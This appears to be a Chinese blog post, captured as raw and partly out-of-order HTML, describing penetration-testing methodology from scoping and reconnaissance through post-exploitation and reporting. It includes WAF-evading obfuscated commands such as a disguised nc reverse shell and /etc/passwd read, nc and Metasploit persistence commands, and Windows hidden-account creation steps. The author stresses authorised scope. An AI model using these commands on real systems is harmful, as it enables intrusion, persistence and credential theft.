class="selector-tag">a</span>, <span class="selector-tag">b</span>, <span class="selector-tag">c</span> 的其他字符就接受的意思。</span><br></pre></td></tr></table></figure>
<p>  比如可以使用</p>
<p>  <code>ls -l</code> 替换成<code>/?in/?s -l</code> <br><br>  <code>cat /etc/passwd</code> 替换成 <code>/?in/cat /?tc/p?sswd</code> <br><br>  <code>nc -e /bin/bash 127.0.0.1 3737</code> 替换成 <code>/??n/?c -e /??n/b??h 2130706433 3737</code></p>
</li>
<li><p>连接符<br>  在bash的操作环境中还有一个非常有用的功能，那就是连接符，需要注意的就是闭合，这点很重要，利用这个我们可以绕过一些匹配字符串的WAF规则</p>
<p>  <code>cat /etc/passwd</code> 替换成 <code>/&#39;b&#39;i&#39;n&#39;/&#39;c&#39;a&#39;t&#39; /&#39;e&#39;t&#39;c&#39;/&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d</code><br><br>  <code>which nc</code> 替换成 <code>/&#39;b&#39;i&#39;n&#39;/&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;n&#39;c</code><br><br>  <code>which wget</code> 替换成 <code>/&#39;b&#39;i&#39;n&#39;/&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;w&#39;g&#39;e&#39;t</code><br><br>  双引号<code>/&quot;b&quot;i&quot;n&quot;/&quot;w&quot;h&quot;i&quot;c&quot;h&quot; &quot;n&quot;c</code><br><br>  反斜杠<code>/b\i\n/w\h\i\c\h n\c</code></p>
</li>
<li><p>未初始化的bash变量<br>  在bash环境中允许我们使用未初始化的bash变量，未初始化的变量值都是null。</p>
<p>  $a,$b,$c</p>
<p>  <code>cat$a /etc$a/passwd$a</code><br>  <code>/bin$s/nc$s -e /bin$s/bash$s 2130706433 3737</code></p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>SSRF</p>
<p>  ServerSide Request Forgery 的简写，允许 Web Interface 请求受保护网络内的资源。</p>
</li>
<li><p>参数</p>
<p>  参数超长是否导致溢出、参数有特殊字符是否会导致程序报错、参数确实是否导致程序报错</p>
</li>
<li><p>业务漏洞检测</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>阶段</th>
<th>功能</th>
<th>功能对应检测点</th>
</tr>
</thead>
<tbody>
<tr>
<td>身份认证</td>
<td>用户注册</td>
<td>是否可以重复注册</td>
</tr>
<tr>
<td>身份认证</td>
<td>密码修改</td>
<td>修改密码逻辑是否有问题</td>
</tr>
<tr>
<td>身份认证</td>
<td>密码重置</td>
<td>重置密码逻辑是否有问题</td>
</tr>
<tr>
<td>身份认证</td>
<td>短信验证码</td>
<td>短信炸弹，逻辑是否有问题、是否可爆破</td>
</tr>
<tr>
<td>身份认证</td>
<td>图片验证码</td>
<td>验证码是否可重复使用</td>
</tr>
<tr>
<td>身份认证</td>
<td>登录</td>
<td>登录逻辑是否有问题</td>
</tr>
<tr>
<td>会话管理</td>
<td>登录</td>
<td>会话ID生成机制是否有问题</td>
</tr>
<tr>
<td>会话管理</td>
<td>登录</td>
<td>是否有超时自动退出机制</td>
</tr>
<tr>
<td>会话管理</td>
<td>退出</td>
<td>退出后会话ID是否真的失效</td>
</tr>
<tr>
<td>访问控制</td>
<td>用户信息查看</td>
<td>是否可以水平越权访问其他用户页面</td>
</tr>
<tr>
<td>访问控制</td>
<td>具有管理员界面</td>
<td>是否可以垂直越权访问管理员页面</td>
</tr>
<tr>
<td>访问控制</td>
<td>具有管理员接口</td>
<td>普通用户直接发包是否也会响应</td>
</tr>
<tr>
<td>业务逻辑</td>
<td>购买</td>
<td>修改价格后端是否会再次校验</td>
</tr>
<tr>
<td>业务逻辑</td>
<td>多步功能</td>
<td>是否跳过其中某些步骤</td>
</tr>
<tr>
<td>业务逻辑</td>
<td>请求次数限制</td>
<td>服务端如何限制是否可以绕过，条件竞争</td>
</tr>
</tbody>
</table>
<p>最后需要注意的是在进行漏洞发现的时候应该对每一个事件利用burpsuite进行抓包仔细观察数据包的传送情况，不放过任何一个可利用的点。</p>
<h2 id="0x04-漏洞验证"><a href="#0x04-漏洞验证" class="headerlink" title="0x04 漏洞验证"></a>0x04 漏洞验证</h2><p>尽可能的由浅入深，旁敲侧推，尽可能的将漏洞的价值发挥到最大化，比如说挖到一枚self-xss ，这个漏洞一般会被忽略，如果说结合csrf漏洞的话那么就是一个中危漏洞了<br><br>再比如说拿到一个企业的邮箱账户，我们可以对其vpn爆破然后进行内网探测等等都是可行的。</p>
<h2 id="0x05-后渗透阶段"><a href="#0x05-后渗透阶段" class="headerlink" title="0x05 后渗透阶段"></a>0x05 后渗透阶段</h2><p>后渗透测试包括内网渗透，权限维持，权限提升，读取用户hash，浏览器密码等等，一般都是点到为止，不会深入。<strong>这里需要注意，是要在客户允许的范围内进行测试，白帽子需要有白帽子的底线！</strong> </p>
<ul>
<li><p>提权</p>
<p>  提权方便进行内网渗透</p>
<ul>
<li><p>系统漏洞提权</p>
<ul>
<li><strong>Windows平台：</strong> 可以通过systeminfo查看系统版本和补丁记录，或使用提权辅助工具<a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">Windows-Exploit-Suggester</a>，参考<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">SecWiki/windows-kernel-exploits</a></li>
<li><strong>Linux平台:</strong> uname -a 查看系统内核版本，如脏牛漏洞，参考<a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">SecWiki/linux-kernel-exploits</a></li>
<li><strong>MacOS平台:</strong> 参考<a href="https://github.com/SecWiki/macos-kernel-exploits" target="_blank" rel="noopener">SecWiki/macos-kernel-exploits</a></li>
</ul>
</li>
<li><p>数据库提权</p>
<p>  利用数据库系统命令执行获取shell，或数据库漏洞如<a href="https://www.cnblogs.com/coderlee/archive/2009/07/18/1526229.html" target="_blank" rel="noopener">mssql的job提权</a>、<a href="https://www.cnblogs.com/wh4am1/p/6613770.html" target="_blank" rel="noopener">mysql的mof提权</a></p>
</li>
<li><p>web中间件漏洞提权</p>
<p>  IIS溢出、tomcat提权</p>
</li>
<li><p>第三方软件提权</p>
<p>  Filezllia提权、搜狗拼音提权</p>
</li>
<li><p>系统错误配置提权</p>
<p>  在windows下可以使用BeRoot工具进行系统配置检查，利用配置错误点进行提权。 </p>
</li>
<li><p>获取或嗅探高权限账号提权</p>
<p>  利用LaZagne project（支持linux、windows、mac），可以抓取chats、mails、database、wifi、sysadmin、wallet、browsers、memory中的密码，可以利用抓取到的密码进行高权限帐号密码测试，也可以利用神器mimikatz和mimipenguin，不过在部分时候由于权限问题可能读取不到部分密码。 </p>
</li>
</ul>
</li>
<li><p>权限维持</p>
<p>  当我们在渗透过程中通过漏洞获取到目标主机权限后，往往会因为服务器管理员发现和修补漏洞而导致对服务器权限的丢失，所以权限维持就显得很重要了。</p>
<ul>
<li>构造隐蔽的WEB漏洞方式维持权限，如文件包含漏洞</li>
<li>webshell</li>
<li><p>账号维权，获取用户名密码，或自建隐藏账号 </p>
<p>  Window 影子账号创建</p>
  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 通过net<span class="built_in"> user </span>xxx$ 123 /<span class="builtin-name">add</span> </span><br><span class="line">2. 打开注册表，找到HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/，双击Administrator记住类型下面的十六进制值0x1f4找到左侧对应得文件夹即000001F4，双击打开复制里面F下的所有内容。 将内容复制到xxx$ 对应的文件夹下面，然后将xxx$ 和00000XXX 导出注册表</span><br><span class="line">3. 接着删除xxx$ 用户 net<span class="built_in"> user </span>xxx$ /del</span><br><span class="line">4. 双击导入刚才导出的两个注册表</span><br></pre></td></tr></table></figure>
</li>
<li><p>常用的远程控制软件</p>
<ul>
<li><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">msf</a> </li>
<li>nc </li>
<li><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">PowerShell Empire</a> </li>
<li><a href="https://github.com/zerosum0x0/koadic" target="_blank" rel="noopener">大宝剑Koadic</a> </li>
<li><a href="https://cobaltstrike.com/" target="_blank" rel="noopener">Cobalt strike</a> </li>
<li><a href="https://github.com/n1nj4sec/pupy" target="_blank" rel="noopener">Pupy</a></li>
<li><a href="https://github.com/nettitude/PoshC2" target="_blank" rel="noopener">PoshC2</a></li>
<li><a href="https://github.com/byt3bl33d3r/gcat" target="_blank" rel="noopener">Gcat</a></li>
<li><a href="https://github.com/trustedsec/trevorc2" target="_blank" rel="noopener">TrevorC2</a></li>
<li><a href="https://github.com/Ne0nd0g/merlin" target="_blank" rel="noopener">Merlin</a></li>
<li><a href="https://github.com/quasar/QuasarRAT" target="_blank" rel="noopener">Quasar</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>nc

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器监听<span class="number">4444</span>端口 nc -lvvp <span class="number">4444</span></span><br><span class="line"></span><br><span class="line">目标执行 nc -t -e cmd<span class="selector-class">.exe</span> x<span class="selector-class">.x</span><span class="selector-class">.x</span><span class="selector-class">.x</span> <span class="number">4444</span> ，并添加开机启动</span><br></pre></td></tr></table></figure>

msf
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">先获得一个Meterpretershell</span><br><span class="line">利用 Persistence模块</span><br><span class="line"><span class="keyword">run</span><span class="bash"> persistence -U -i 10 -p 4444 -r x.x.x.x</span></span><br><span class="line"><span class="bash"></span></span><br><span class="line"><span class="bash">    -U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；</span></span><br><span class="line"><span class="bash">    -i：设置反向连接间隔时间，单位为秒；</span></span><br><span class="line"><span class="bash">    -p：设置反向连接的端口号；</span></span><br><span class="line"><span class="bash">    -r：设置反向连接的ip地址。</span></span><br><span class="line"><span class="bash"></span></span><br><span class="line"><span class="bash">Metsvc 模块</span></span><br><span class="line"><span class="bash"></span></span><br><span class="line"><span class="bash">run metsvc -A</span></span><br><span class="line"><span class="bash">直接在目标主机上开启一个服务</span></span><br><span class="line"><span class="bash">利用handler下的windows/metsvc_bind_tcp模块，重新获得shell</span></span><br></pre></td></tr></table></figure>
</code></pre><ul>
<li><p>内网渗透</p>
<p>  内网渗透通常是拿下某个内网访问权限后在内网中渗透，在企业的网络建设里，有些数据资源需要保护起来，于是选择放在内网，这是一点，还有一点跟互联网地址空间、资金有关，于是NAT地址转换、端口转发技术应用的越来越多，形成了一个网关、N台服务器的形式，当某个对外服务被黑客入侵，那么黑客还会使用这个缺口继续深入，但是内网中的网络管理安全强度并没有外网那么严谨，导致Wannacry、震网等病毒统治内网，还有就是内网的服务、服务器大多采用默认配置，这并不是一个非常安全的方案，可并未重视起来。</p>
<p>  网络拓扑探测</p>
<pre><code>安全域、防火墙、ids/ips
</code></pre><p>  内网弱口令<br>  内网服务器漏洞<br>  内网网络设备漏洞<br>  内网个人终端漏洞</p>
<pre><code>系统层ms17-010等   office漏洞     
</code></pre><p>  内网钓鱼<br>  中间人攻击<br>  内网穿透</p>
</li>
</ul>
<h2 id="0x06-报告编写"><a href="#0x06-报告编写" class="headerlink" title="0x06 报告编写"></a>0x06 报告编写</h2><p>一个好的渗透测试报告至关重要。<br>只有编写完渗透测试报告这次渗透测试才算完全结束。<br><br>首先你需要明确漏洞名称以及漏洞原理。<br>其次要注明参与人员，测试时间，内网外网<br></p>
<ul>
<li>按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告</li>
<li>补充介绍：要对漏洞成因，验证过程和带来危害进行分析</li>
<li>修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</li>
</ul>
<h2 id="0x07-风险规避"><a href="#0x07-风险规避" class="headerlink" title="0x07 风险规避"></a>0x07 风险规避</h2><ol>
<li>不要进行诸如ddos攻击，不破坏数据</li>
<li>测试之前对重要数据进行备份</li>
<li>任何测试执行前必须和客户进行沟通，以免引来不必要的麻烦</li>
<li>可以对原始系统生成镜像环境，然后对镜像环境进行测试</li>
<li>明确渗透测试范围</li>
</ol>

        
<!--
        </br>
        <span id="busuanzi_container_page_pv">
          阅读次数<span id="busuanzi_value_page_pv"></span>
        </span>
        <blockquote>
<p><strong>总结，持续更新</strong></p>
</blockquote>
<blockquote>
<p><strong>白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!</strong></p>
</blockquote>
<blockquote>
<p><strong>是要在客户允许的范围内进行测试，白帽子需要有白帽子的底线！</strong></p>
</blockquote>
<blockquote>
<p><strong>常在河边走很容易就湿鞋，但如果你熟知法律边界，知道有一条不可触碰的高压线摆在那，你就可以做到常在河堤走，永远不湿鞋。-TK教主</strong></p>
</blockquote>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>渗透测试是指渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，以期发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并提交给网络所有者。网络所有者根据渗透人员提供的渗透测试报告，可以清晰知晓系统中存在的安全隐患和问题。<br><br>渗透测试不同于入侵，入侵是不择手段的，甚至是居右破坏性的拿到系统权限<br><a id="more"></a></p>
<h2 id="0x01-明确目标"><a href="#0x01-明确目标" class="headerlink" title="0x01 明确目标"></a>0x01 明确目标</h2><p>当拿到一个合法的渗透测试项目时，我们首先应该明确客户要求我们进行渗透测试的范围以及整体项目的时间。</p>
<ul>
<li>确定范围：测试目标的范围，ip，域名，内外网。</li>
<li>确定规则：能渗透到什么程度，时间？能否修改上传？能否提权？哪些社工手段不能使用等。</li>
<li>确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等等。（立体全方位）</li>
</ul>
<p>不会些什么长篇大论，都是CV的，现在在甲方，渗透尽量在不影响业务系统正常运行的前提下进行一次完整的测试，需要全面测试，不能只测出来几个漏洞应付了事了。当然，版本迭代/新业务线啥的一般都是在测试环境上做了，线上的主要看有没有配置问题（服务器/中间件等安全基线这块都没做）</p>
<h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><p>在对一个站进行渗透测试的过程中，信息收集是非常重要的。信息收集的详细与否可能决定着此次渗透测试的结果，知己知彼，百战不殆。</p>
<p>信息搜集分为主动信息搜集和被动信息搜集。</p>
<p>主动信息搜集就是通过直接访问和扫描信息的方式进行收集信息，缺点是会记录自己的操作信息；被动信息搜集就是通过第三方服务进行信息搜集，缺点是收集信息有限。</p>
<ul>
<li><p>真实IP查询</p>
<p>  企业常常为了增强网页访问速度为服务加cdn，CDN的虚假IP干扰了我们的渗透测试，如何判断是否做了cdn<br><br>  可以通过<a href="http://ping.chinaz.com/" target="_blank" rel="noopener">站长工具多地ping服务</a>，或使用nslookup进行检测，如果做了cdn的话域名解析会返回多个IP地址<br><br>  验证ip和域名是否真实对应，修改本地hosts文件，强行将域名与ip解析对应，然后访问域名，查看页面是否变化<br><br>  如何绕过cdn查询真实IP的一些方法：<br></p>
<ol>
<li><strong>ping顶级域名或子域名</strong>，一般企业都只会对www域名做cdn，而常常忽略了空域名和子域名,确定了没有使用CDN的二级域名后，本地将目标域名绑定到同ip，能访问就说明目标站与二级域名在同一服务器，也可能在同C段，扫描C段所有开80端口的ip，挨个尝试</li>
<li><p><strong>查询历史dns记录</strong>,如果存在做了cdn之前的历史记录也是可以查到真实ip的，相关查询网站有：</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//dnsdb.io/zh-cn/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//x.threatbook.cn/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//toolbar.netcraft.com/site_report?url=</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//viewdns.info/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//whoisrequest.com/history/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//tools.ipip.net/cdn.php</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//securitytrails.com/</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>DNS社工库 <em>Ps.和查询历史dns记录道理一样，没有相关的裤子</em></p>
</li>
<li>还可以使用对方的邮件服务（如注册激活邮件、找回密码），站点的sendmail功能或者是rss订阅服务，当目标给你发送了一条消息也可以从消息中找到真实ip</li>
<li>利用国外的vps去ping一下域名，大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率直接解析到真实IP。</li>
<li>网站的各种探针类文件，如phpinfo里面的<code>_SERVER[&quot;SERVER_ADDR&quot;]</code>也包含的有服务器端的真实ip，当然这个情况还是比较少的，因为一般都会把phpinfo给删除</li>
<li>如果目标网站有自己的app或软件产品,抓下它的请求,看看能不能这里面找到目标的真实ip</li>
<li>通过各种漏洞或其他方式想办法让目标反向连接我们，比如命令执行反弹shell、ssrf漏洞、xss盲打后台，被动和目标数据库建立连接等等</li>
<li><p>使用<code>nslookup</code>或<code>dig</code>更改dns为国外的不知名的dns服务器来解析目标域名的各种记录（ns、a、mx等）可能查到其真实ip</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">收集的部分国外<span class="selector-tag">dns</span>服务器</span><br><span class="line">209<span class="selector-class">.244</span><span class="selector-class">.0</span><span class="selector-class">.3</span></span><br><span class="line">64<span class="selector-class">.6</span><span class="selector-class">.64</span><span class="selector-class">.6</span></span><br><span class="line">8<span class="selector-class">.8</span><span class="selector-class">.8</span><span class="selector-class">.8</span></span><br><span class="line">9<span class="selector-class">.9</span><span class="selector-class">.9</span><span class="selector-class">.9</span></span><br><span class="line">8<span class="selector-class">.26</span><span class="selector-class">.56</span><span class="selector-class">.26</span></span><br><span class="line">199<span class="selector-class">.85</span><span class="selector-class">.126</span><span class="selector-class">.10</span></span><br><span class="line">208<span class="selector-class">.67</span><span class="selector-class">.222</span><span class="selector-class">.222</span></span><br><span class="line">195<span class="selector-class">.46</span><span class="selector-class">.39</span><span class="selector-class">.39</span></span><br><span class="line">69<span class="selector-class">.195</span><span class="selector-class">.152</span><span class="selector-class">.204</span></span><br><span class="line">208<span class="selector-class">.76</span><span class="selector-class">.50</span><span class="selector-class">.50</span></span><br><span class="line">216<span class="selector-class">.146</span><span class="selector-class">.35</span><span class="selector-class">.35</span></span><br><span class="line">37<span class="selector-class">.235</span><span class="selector-class">.1</span><span class="selector-class">.174</span></span><br><span class="line">198<span class="selector-class">.101</span><span class="selector-class">.242</span><span class="selector-class">.72</span></span><br><span class="line">77<span class="selector-class">.88</span><span class="selector-class">.8</span><span class="selector-class">.8</span></span><br><span class="line">91<span class="selector-class">.239</span><span class="selector-class">.100</span><span class="selector-class">.100</span></span><br><span class="line">74<span class="selector-class">.82</span><span class="selector-class">.42</span><span class="selector-class">.42</span></span><br><span class="line">109<span class="selector-class">.69</span><span class="selector-class">.8</span><span class="selector-class">.51</span></span><br><span class="line">156<span class="selector-class">.154</span><span class="selector-class">.70</span><span class="selector-class">.1</span></span><br><span class="line">1<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.1</span></span><br><span class="line">45<span class="selector-class">.77</span><span class="selector-class">.165</span><span class="selector-class">.194</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>让服务器去访问你的vps，比如说这个网址有设置头像的方式，并且可以直接填写头像的url，或者插入远程图片，那么我们可以把图片放在自己vps上提交给服务器，那么也可以从日志中得到真实ip</p>
</li>
<li>DDOS，耗尽CDN流量，回源之后找到真实ip。不设防的cdn量大就会挂，高防CDN要增大流量 <em>Ps.没有资源，现在防ddos也比较强，没尝试过</em></li>
<li>社工手段，拿到目标网站管理员在cdn的账号，从配置中找到网站的真实IP地址   <em>Ps.沟通障碍</em></li>
<li>全网扫描zmap，使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host字段匹配相关域名 <em>Ps.因造成网络拥堵，后续没有尝试</em></li>
<li>通过shadan/zoomeye/fofa搜索网站特殊标题、内容、网站源码</li>
<li>cloudflare，如<a href="https://github.com/m0rtem/CloudFail" target="_blank" rel="noopener">CloudFail</a>、<a href="http://www.freebuf.com/articles/web/41533.html" target="_blank" rel="noopener">CloudFlare防护下的破绽：寻找真实IP的几条途径</a>、<a href="http://crimeflare.net:83/cfssl.html" target="_blank" rel="noopener">http://crimeflare.net:83/cfssl.html(需要翻墙)</a></li>
</ol>
</li>
</ul>
<ul>
<li><p>whois信息查询</p>
<p>  当拿到一个域名的时候，我们首先应该进行whois查询，可以使kali 下面的 whois命令或者使用<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">chinaz在线工具</a>，whois信息可以获取关键注册人的信息，包括注册公司、注册邮箱、管理员邮箱、管理员联系手机等,对后期社工很有用，还可以查询同一注册人注册的其他的域名，域名对应的NS记录、MX记录，自动识别国内常见的托管商（万网、新网等）。或者我们可以有针对性的利用其信息生成字典，对后台或者其他登录功能进行爆破。</p>
</li>
<li><p>利用搜索引擎发现和侦察信息泄露，如google hacking获得后台，未授权页面，敏感url等</p>
<p>  利用google去搜索包括特殊文本字符串的网页<br>  inurl:xxx filetype:xls<br>  inurl:xxx site:xxx.com</p>
</li>
<li><p>旁站C段查询</p>
<p>  旁站是和目标网站在同一台服务器上的其它的网站；如果从目标站本身找不到好的入手点，这时候，如果想快速拿下目标的话，一般都会先找个目标站点所在服务器上其他的比较好搞的站下手，然后再想办法跨到真正目标的站点目录中。C段是和目标机器ip处在同一个C段的其它机器；通过目标所在C段的其他任一台机器，想办法跨到我们的目标机器上。常用的工具有<a href="http://www.cnblogs.com/dongchi/p/4155368.html" target="_blank" rel="noopener">ip反查</a>，Nmap，Zenmap。</p>
</li>
<li><p>指纹识别</p>
<p>  通过指纹识别，我们可以明确这个网站服务器是用什么操作系统（win/linux）<br></p>
<ul>
<li>TTL</li>
<li>路径大小写</li>
<li>访问不存在的页面<br>针对一个web服务，我们应该首先明确这个是由什么语言开发的前后端，常见脚本语言有php/asp/aspx/jsp等</li>
<li>respone包头</li>
<li>index.php/index.jsp/index.asp</li>
<li><p>爬虫爬取网站结构，看xx.jsp?等</p>
<p>使用的什么webserver版本和类型，因为不同的webserver也有不同的解析漏洞或者其他的漏洞，常见的服务器包括apache/tomcat/iis/nginx。<br></p>
</li>
<li>使用浏览器插件(wappalyzer)可以很方便的查看这些信息<br></li>
<li>使用nc 或telnet 可以观察数据包特征或者网页加载的特殊文件来识别cms，如<code>nc xxx.com 80</code></li>
<li>通过Zoomeye、Shodan等在线系统搜集</li>
<li>利用Nmap(<code>namp -sT -Pn -v &lt;IP&gt;</code>)、MSF、Zmap等端口和指纹识别功能搜集</li>
<li><p>使用burpsuite、Niketo、Whatweb、在线cms指纹识别工具等</p>
<ul>
<li>HTTP 标头 ，如 X-Powered-By 字段</li>
<li>cookie </li>
<li>HTML 源代码</li>
<li>特定文件和文件夹，例如/templets/default/style/dedecms.css — dedecms</li>
<li>网站独有文件的md5，例如favicon.ico</li>
<li>网站命名规则；返回头的关键字；网页关键字；URL特征；Meta特征；Script特征；robots.txt；网站路径特征；网站静态资源；爬取网站目录信息等<br>是否用了某种开源程序cms，然后我们可以利用公开的对应版本的poc、默认的后台登录页/数据库服务端口认证等进行测试，当然我们也可以将对应版本的源码下载下来进行代码审计。<br><br>用什么框架开发的，如Thinkphp、struts2，很多网站都利用开源的框架来快速开发网站，所以收集网站的框架信息也是非常关键的。 <figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">开源的软件</span><br><span class="line"></span><br><span class="line">常见的开源软件有：wordpress、phpbb、dedecms等</span><br><span class="line">开源的框架</span><br><span class="line"></span><br><span class="line">常见的开源框架有：<span class="keyword">Struts2、 </span>Spring MVC、ThinkPHP等</span><br><span class="line">中间件服务器</span><br><span class="line"></span><br><span class="line">常见的中间件服务器有：jboss、tomcat、Weblogic等</span><br><span class="line">数据库服务</span><br><span class="line"></span><br><span class="line">常见的数据库服务：mssql、mysql、oracle、redis、sybase、MongoDB、DB2等</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>是否使用负载均衡，负载均衡是通过在多个服务器中分割WEB流量，来确保单个服务器的请求不会超载，一般不可见，但是有可能极大的改变渗透测试的进程。当发出请求的时候，负载均衡可能将请求交给其中的一个服务器来处理。每个服务器的应用结构虽然相同，但是文件夹不同、补丁级别不同及其他配置可能完全不同</p>
</li>
<li>使用kali下的lbd工具识别</li>
<li><a href="https://github.com//jmbr/halberd" target="_blank" rel="noopener">halberd</a></li>
<li>msf下 <code>auxiliary/gather/f5_bigip_cookie_disclosure</code> 模块</li>
<li>对临近IP段进行扫描</li>
<li>响应时间戳分析：有些服务器没有同步时间，就可以在一秒发出多个请求确定是否有多台服务器</li>
<li>通过比较相同请求资源的首部响应中的ETag和Last-Modified的值，能够确定是否会从多个服务器上的到不同的文件</li>
<li>通过查找cookie：有些服务器会在HTTP会话中加入自己的cookie来指定负载回话</li>
<li>枚举SSL异常：查看SSL证书是否存在差异，是否支持同一个密码长度</li>
<li><p>检查HTML源码中返回的注释</p>
<p>是否存在防护设备</p>
</li>
<li><p>有没有waf，具体是什么类型waf，可以在目标url的动态参数输入一些敏感特征，看是否拦截，也可以用工具判断whatwaf、wafw00f，熟悉各种bypasswaf的骚姿势</p>
</li>
<li>服务器防火墙是否开放，一般都会禁止icmp，通过ping命令探测</li>
</ul>
</li>
</ul>
<ul>
<li><p>历史漏洞收集</p>
<p>  了解目标历史漏洞对我们帮助也是非常的大，至少我们可以知道网站设计人员喜欢在什么地方犯错误，喜欢犯什么类型的错误。这样我们可以有针对性的进行渗透测试，或者说我们可以查看是否已经修补过得漏洞是否能够绕过。exploitdb 、hackerone、CNVD 、乌云漏洞库镜像站。 </p>
</li>
<li><p>利用app进行信息收集</p>
<p>  可以利用工具对其进行逆向，找出其所使用的url链接，然后进行专门的渗透测试</p>
</li>
<li><p>敏感目录/文件</p>
<p>  敏感目录包括但不限于网站的敏感文件（.mdb,.excel,.word,.zip,.rar），各类web入口（后台、控制台弱口令、爆破）、未授权访问的上传页面，文本编辑器、robots.txt、.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF/web.xml泄露或者phpmyadmin等等目录。<br>就拿备份文件来讲，一般人拿到以后只会查看是否有数据库账号密码进行连接，如果没有就无从下手,其实我们可以通过代码审计发现它的漏洞进行渗透测试。再比如phpmyadmin，我们可以使用爆破工具对其账号密码进行爆破。或者是之前有黑阔留下的后门文件，我们也可以爆破其密码进行利用。<br>目录扫描有两种方式，使用目录字典进行暴力才接存在该目录或文件返回200或者403；使用爬虫爬行主页上的所有链接，对每个链接进行再次爬行，收集这个域名下的所有链接，然后总结出需要的信息。常用工具<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>、御剑、wwwscan、爬虫等发现或爆破发现隐藏页面，增加攻击面</p>
</li>
<li><p>端口信息</p>
<p>  服务和安全是相对应的，每开启一个端口，那么攻击面就大了一点，开启的端口越多，也就意味着服务器面临的威胁越大，如服务配置错误、服务自身漏洞利用、弱口令等。当拿到一个ip的时候，我们一般都需要使用nmap或者其他同类扫描工具如masscan对其开放端口以及端口对应的服务和版本信息进行扫描。通过端口开放情况，我们可以针对性的对其进行渗透测试</p>
<p>  关键的操作就是确定端口后边的软件及软件版本，然后去个漏洞库去查找其存在的漏洞乃至exp<br>  搜索漏洞信息</p>
<ul>
<li><a href="http://www.cvedetails.com/version-search.php" target="_blank" rel="noopener">CVE漏洞库搜索</a></li>
<li><a href="http://cve.mitre.org/cve/search_cve_list.html" target="_blank" rel="noopener">mitre_cve漏洞信息搜索</a><br>通过cve获取exp</li>
<li>通过metasploit搜索<code>msf&gt; search cve:2018-xxxx</code></li>
<li><a href="https://www.exploit-db.com/search/" target="_blank" rel="noopener">exploit-db</a></li>
<li>github搜索</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>端口号</th>
<th>端口服务/协议简要说明</th>
<th>关于端口可能的一些渗透用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>tcp 20,21</td>
<td>ftp 默认的数据和命令传输端口[可明文亦可加密传输]</td>
